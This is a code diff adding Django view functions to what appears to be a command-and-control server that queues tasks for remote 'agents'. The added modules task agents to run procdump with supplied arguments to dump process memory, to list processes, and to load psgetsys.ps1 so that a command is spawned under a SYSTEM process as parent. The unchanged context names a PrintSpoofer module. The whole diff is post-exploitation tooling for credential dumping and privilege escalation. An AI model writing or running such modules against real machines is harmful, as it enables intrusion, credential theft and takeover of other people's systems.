@@ -372,3 +372,65 @@ def printspoofer (request):
     else:
         return render(request, 'blog/listeners.html')
 
+
+def procdump (request):
+    if request.method=='POST':
+        Args = request.POST['Args']
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        exeFile = request.POST['exeFile']    
+        dmpFile = request.POST['dmpFile']
+        task = 'procdump.exe {} {} {}'.format(Args,exeFile,dmpFile)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+
+def tasklist (request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        
+        task = 'tasklist'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def PoCScript (request):
+    if request.method=='POST':
+        Args = request.POST['Args']
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        system_pid = request.POST['system_pid']    
+        command_to_execute = request.POST['command_to_execute']
+        #give user note in GUI to transfer the PoCScript  first --> psgetsys.ps1
+        task = 'import-module psgetsys.ps1;  [MyProcess]::CreateProcessFromParent({},{})'.format(system_pid,command_to_execute)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+        
+
